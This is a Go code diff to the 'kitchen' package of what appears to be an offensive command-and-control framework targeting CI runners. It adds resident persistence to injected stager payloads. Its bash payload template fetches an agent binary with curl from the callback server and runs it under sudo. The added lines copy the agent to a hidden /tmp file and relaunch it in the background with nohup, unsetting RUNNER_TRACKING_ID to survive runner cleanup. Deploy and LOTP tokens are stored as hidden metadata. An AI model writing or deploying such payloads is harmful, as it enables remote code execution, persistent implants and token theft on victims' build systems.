@@ -5,6 +5,7 @@ package kitchen
 
 import (
 	"fmt"
+	"net/url"
 	"sort"
 	"strings"
 	"sync"
@@ -12,30 +13,43 @@ import (
 )
 
 const (
-	CallbackModeExpress = "express"
-	CallbackModeDwell   = "dwell"
+	CallbackModeExpress  = "express"
+	CallbackModeDwell    = "dwell"
+	CallbackModeResident = "resident"
+
+	selfHostedResidentRetryWindow = time.Hour
+	selfHostedResidentInterval    = 5 * time.Second
+
+	stagerMetadataDeployToken = "deploy_token"
+	stagerMetadataLOTPToken   = "lotp_token"
 )
+
+var privateStagerMetadataKeys = map[string]struct{}{
+	stagerMetadataDeployToken: {},
+	stagerMetadataLOTPToken:   {},
+}
 
 // RegisteredStager is a stager waiting for callback from an injected payload.
 type RegisteredStager struct {
-	ID            string
-	ResponseType  string
-	Payload       string
-	CreatedAt     time.Time
-	ExpiresAt     time.Time
-	CalledBack    bool
-	CallbackAt    time.Time
-	CallbackIP    string
-	SessionID     string
-	Metadata      map[string]string
-	DwellTime     time.Duration
-	Persistent    bool
-	MaxCallbacks  int
-	DefaultMode   string
-	NextMode      string
-	CallbackCount int
-	LastAgentID   string
-	RevokedAt     *time.Time
+	ID              string
+	ResponseType    string
+	Payload         string
+	CreatedAt       time.Time
+	ExpiresAt       time.Time
+	CalledBack      bool
+	CallbackAt      time.Time
+	CallbackIP      string
+	SessionID       string
+	Metadata        map[string]string
+	PrivateMetadata map[string]string `json:"-"`
+	DwellTime       time.Duration
+	Persistent      bool
+	MaxCallbacks    int
+	DefaultMode     string
+	NextMode        string
+	CallbackCount   int
+	LastAgentID     string
+	RevokedAt       *time.Time
 }
 
 type CallbackInvocation struct {
@@ -102,7 +116,12 @@ func (s *StagerStore) Register(stager *RegisteredStager) error {
 		stager.MaxCallbacks = 1
 	}
 
-	s.stagers[stager.ID] = cloneRegisteredStager(stager)
+	registered := cloneRegisteredStager(stager)
+	publicMetadata, privateMetadata := splitStagerMetadata(registered.Metadata)
+	registered.Metadata = publicMetadata
+	registered.PrivateMetadata = mergeStagerMetadata(registered.PrivateMetadata, privateMetadata)
+
+	s.stagers[stager.ID] = registered
 	return nil
 }
 
@@ -145,6 +164,26 @@ func (s *StagerStore) MarkCalledBack(id, remoteIP string) bool {
 	stager.CallbackAt = time.Now()
 	stager.CallbackIP = remoteIP
 	return true
+}
+
+func (s *StagerStore) ObservePersistentBeacon(id, remoteIP, agentID string, when time.Time) *RegisteredStager {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	stager, exists := s.stagers[id]
+	if !exists || !stager.Persistent || stager.RevokedAt != nil {
+		return nil
+	}
+
+	stager.CalledBack = true
+	stager.CallbackAt = when
+	if remoteIP != "" {
+		stager.CallbackIP = remoteIP
+	}
+	if agentID != "" {
+		stager.LastAgentID = agentID
+	}
+	return cloneRegisteredStager(stager)
 }
 
 func (s *StagerStore) ResolveCallback(id, remoteIP, agentID string) (*RegisteredStager, CallbackInvocation, bool) {
@@ -218,6 +257,9 @@ func (s *StagerStore) ListPersistent(sessionID string) []*RegisteredStager {
 		if !stager.Persistent {
 			continue
 		}
+		if stager.RevokedAt != nil {
+			continue
+		}
 		if sessionID != "" && stager.SessionID != sessionID {
 			continue
 		}
@@ -281,6 +323,11 @@ func (s *StagerStore) ControlPersistent(id, action string) (*RegisteredStager, e
 }
 
 func (s *StagerStore) UpdateMetadata(id string, metadata map[string]string) *RegisteredStager {
+	publicMetadata, privateMetadata := splitStagerMetadata(metadata)
+	return s.UpdateMetadataWithPrivate(id, publicMetadata, privateMetadata)
+}
+
+func (s *StagerStore) UpdateMetadataWithPrivate(id string, metadata, privateMetadata map[string]string) *RegisteredStager {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 
@@ -289,14 +336,8 @@ func (s *StagerStore) UpdateMetadata(id string, metadata map[string]string) *Reg
 		return nil
 	}
 
-	if len(metadata) > 0 {
-		if stager.Metadata == nil {
-			stager.Metadata = make(map[string]string, len(metadata))
-		}
-		for k, v := range metadata {
-			stager.Metadata[k] = v
-		}
-	}
+	stager.Metadata = mergeStagerMetadata(stager.Metadata, publicStagerMetadata(metadata))
+	stager.PrivateMetadata = mergeStagerMetadata(stager.PrivateMetadata, privateMetadata)
 
 	return cloneRegisteredStager(stager)
 }
@@ -416,11 +457,96 @@ func cloneRegisteredStager(stager *RegisteredStager) *RegisteredStager {
 			cloned.Metadata[k] = v
 		}
 	}
+	if stager.PrivateMetadata != nil {
+		cloned.PrivateMetadata = make(map[string]string, len(stager.PrivateMetadata))
+		for k, v := range stager.PrivateMetadata {
+			cloned.PrivateMetadata[k] = v
+		}
+	}
 	if stager.RevokedAt != nil {
 		revokedAt := *stager.RevokedAt
 		cloned.RevokedAt = &revokedAt
 	}
 	return &cloned
+}
+
+func isResidentPersistenceRegisteredStager(stager *RegisteredStager) bool {
+	if stager == nil || stager.Metadata == nil {
+		return false
+	}
+	return stager.Metadata["persistence_mode"] == "resident"
+}
+
+func splitStagerMetadata(metadata map[string]string) (public, private map[string]string) {
+	if len(metadata) == 0 {
+		return nil, nil
+	}
+
+	public = make(map[string]string, len(metadata))
+	private = make(map[string]string)
+	for k, v := range metadata {
+		if _, ok := privateStagerMetadataKeys[k]; ok {
+			private[k] = v
+			continue
+		}
+		public[k] = v
+	}
+	if len(public) == 0 {
+		public = nil
+	}
+	if len(private) == 0 {
+		private = nil
+	}
+	return public, private
+}
+
+func publicStagerMetadata(metadata map[string]string) map[string]string {
+	public, _ := splitStagerMetadata(metadata)
+	return public
+}
+
+func cloneStagerMetadata(metadata map[string]string) map[string]string {
+	if len(metadata) == 0 {
+		return nil
+	}
+	cloned := make(map[string]string, len(metadata))
+	for k, v := range metadata {
+		cloned[k] = v
+	}
+	return cloned
+}
+
+func mergeStagerMetadata(dst, src map[string]string) map[string]string {
+	if len(src) == 0 {
+		return dst
+	}
+	if dst == nil {
+		dst = make(map[string]string, len(src))
+	}
+	for k, v := range src {
+		dst[k] = v
+	}
+	return dst
+}
+
+func stagerPersistRelaunch(stager *RegisteredStager, kitchenURL string) (callbackMode, relaunchFlags string) {
+	if !isResidentPersistenceRegisteredStager(stager) {
+		return CallbackModeExpress, "-express"
+	}
+
+	flags := []string{"-interval " + selfHostedResidentInterval.String()}
+	if tryCloudflareKitchenURL(kitchenURL) {
+		flags = append(flags, "-max-offline "+selfHostedResidentRetryWindow.String())
+	}
+	return CallbackModeResident, strings.Join(flags, " ")
+}
+
+func tryCloudflareKitchenURL(rawURL string) bool {
+	parsed, err := url.Parse(strings.TrimSpace(rawURL))
+	if err != nil {
+		return false
+	}
+	return strings.HasSuffix(strings.TrimSpace(parsed.Hostname()), ".trycloudflare.com")
 }
 
 // DefaultBashPayload returns the default bash payload for a stager callback.
@@ -462,6 +588,8 @@ func authenticatedBashPayloadTemplate(extraEnv []string, extraArgs string) strin
 		`CALLBACK_ID="{{CALLBACK_ID}}"`,
 		`CALLBACK_MODE="{{CALLBACK_MODE}}"`,
 		`DWELL_FLAGS="{{DWELL_FLAGS}}"`,
+		`PERSIST_CALLBACK_MODE="{{PERSIST_CALLBACK_MODE}}"`,
+		`PERSIST_RELAUNCH_FLAGS="{{PERSIST_RELAUNCH_FLAGS}}"`,
 	}
 	lines = append(lines, extraEnv...)
 	lines = append(lines,
@@ -475,6 +603,12 @@ func authenticatedBashPayloadTemplate(extraEnv []string, extraArgs string) strin
 		`curl -s -H "X-Agent-Token: $AGENT_TOKEN" -o "$AGENT_BIN" "$KITCHEN_URL/agent/brisket-${OS}-${ARCH}"`,
 		`if [ -s "$AGENT_BIN" ]; then`,
 		`  chmod +x "$AGENT_BIN"`,
+		`  if [ -n "${SMOKEDMEAT_PERSIST:-}" ] && [ "$OS" = "linux" ]; then`,
+		`    PERSIST_BIN="/tmp/.brisket-persist-$RANDOM"`,
+		`    cp "$AGENT_BIN" "$PERSIST_BIN"`,
+		`    chmod +x "$PERSIST_BIN"`,
+		`    env -u RUNNER_TRACKING_ID nohup sh -c "\"$PERSIST_BIN\" -kitchen \"$KITCHEN_URL\" -session \"$SESSION_ID\" -agent \"$AGENT_ID\" -token \"$AGENT_TOKEN\" -callback-id \"$CALLBACK_ID\" -callback-mode \"$PERSIST_CALLBACK_MODE\" $PERSIST_RELAUNCH_FLAGS >/dev/null 2>&1; rm -f \"$PERSIST_BIN\"" >/dev/null 2>&1 &`,
+		`  fi`,
 		fmt.Sprintf(`  if [ "$OS" = "linux" ] || [ "$OS" = "darwin" ]; then
     sudo -E "$AGENT_BIN" -kitchen "$KITCHEN_URL" -session "$SESSION_ID" -agent "$AGENT_ID" -token "$AGENT_TOKEN" -callback-id "$CALLBACK_ID" -callback-mode "$CALLBACK_MODE" $DWELL_FLAGS%s
   else
@@ -526,7 +660,11 @@ req.end();
 // DefaultBashPayloadWithDwell returns a bash payload with optional dwell time.
 // If dwellTime > 0, agent stays active for that duration to enable pivoting with ephemeral tokens.
 func DefaultBashPayloadWithDwell(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration) string {
-	return renderStagerPayloadTemplate(
+	return DefaultBashPayloadWithDwellAndPersistence(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode, dwellTime, CallbackModeExpress, "-express")
+}
+
+func DefaultBashPayloadWithDwellAndPersistence(kitchenURL, agentID, sessionID, agentToken, callbackID, callbackMode string, dwellTime time.Duration, persistCallbackMode, persistRelaunchFlags string) string {
+	return renderStagerPayloadTemplateWithPersistence(
 		authenticatedBashPayloadTemplate(nil, ""),
 		kitchenURL,
 		agentID,
@@ -535,6 +673,24 @@ func DefaultBashPayloadWithDwell(kitchenURL, agentID, sessionID, agentToken, cal
 		callbackID,
 		callbackMode,
 		dwellTime,
+		persistCallbackMode,
+		persistRelaunchFlags,
+	)
+}
+
+func DefaultBashPayloadForRegisteredStager(kitchenURL, agentID, sessionID, agentToken string, stager *RegisteredStager, invocation CallbackInvocation) string {
+	persistCallbackMode, persistRelaunchFlags := stagerPersistRelaunch(stager, kitchenURL)
+	return renderStagerPayloadTemplateWithPersistence(
+		authenticatedBashPayloadTemplate(nil, ""),
+		kitchenURL,
+		agentID,
+		sessionID,
+		agentToken,
+		stager.ID,
+		invocation.Mode,
+		invocation.DwellTime,
+		persistCallbackMode,
+		persistRelaunchFlags,
 	)
 }
 
